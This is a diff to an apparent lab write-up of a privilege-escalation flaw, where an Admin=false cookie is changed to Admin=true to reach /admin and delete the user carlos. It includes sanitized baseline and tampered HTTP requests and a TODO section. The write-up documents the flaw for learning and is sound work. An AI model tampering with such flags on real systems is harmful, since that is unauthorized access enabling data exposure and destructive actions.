@@ -18,16 +18,29 @@ By tampering with this value, a normal user can access admin functionality and p
 6. Perform a privileged action (in the lab: delete user `carlos`).
 
 ## Evidence (sanitized)
-Request showing access denied state (sanitized):
+### Baseline (non-admin)
+Request (sanitized):
 ```http
 GET /admin HTTP/2
 Host: <lab-host>
 Cookie: Admin=false; session=<redacted>
 ```
 
-Evidence to add (optional, recommended):
-- The login response header where the app sets `Admin=false` (e.g., `Set-Cookie: Admin=false; ...`)
-- A follow-up request with `Admin=true` and a successful `/admin` response (e.g., 200 OK)
+Expected result: access denied (e.g., 401/403 or redirect).
+
+### Privilege escalation (admin flag tampering)
+**TODO (add from Burp, sanitized):**
+1) Login response sets a forgeable admin indicator:
+```http
+Set-Cookie: Admin=false; session=<redacted>
+```
+2) After tampering the flag:
+```http
+GET /admin HTTP/2
+Host: <lab-host>
+Cookie: Admin=true; session=<redacted>
+```
+Observed result: admin panel accessible (e.g., 200 OK) and privileged action possible (lab: delete `carlos`).
 
 ## Impact
 Privilege escalation to administrator. In real systems this can lead to account takeover, data exposure, and destructive actions.
